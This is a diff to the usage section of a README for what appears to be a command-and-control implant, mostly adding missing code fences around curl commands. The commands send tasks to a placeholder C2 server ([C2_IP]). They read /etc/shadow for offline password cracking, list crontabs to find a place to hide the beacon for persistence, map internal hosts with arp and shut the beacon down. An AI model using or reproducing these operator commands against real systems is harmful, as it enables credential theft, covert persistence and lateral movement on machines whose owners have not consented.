@@ -60,24 +60,30 @@ No external config file is required on the target to minimize the disk footprint
 **Issue a command (e.g., check identity):**
 ```bash
 curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "SRC-01", "cmd": "whoami"}'
+```
 
 ### Examples of Advanced Usage
 **Exfiltrate Sensitive System Files:**
 ```bash
 # Capture the shadow file for offline cracking
 curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "SRC-01", "cmd": "cat /etc/shadow"}'
+```
 
 ### Check for persistance opertunities
 # List all crontabs to find a place to hide the beacon trigger
 curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "GRV-01", "cmd": "crontab -l"}'
 
 ### Enumerate Internal Network via the Target
+```bash
 # Scan the local ARP cache to find other live hosts on the internal subnet
 curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "GRV-01", "cmd": "arp -a"}'
+```
 
 ### Remote Process Termination
+```bash
 # Gracefully shut down the beacon and stop check-ins
 curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "GRV-01", "cmd": "exit"}'
+```
 
 ## 5. Operational Notes
 
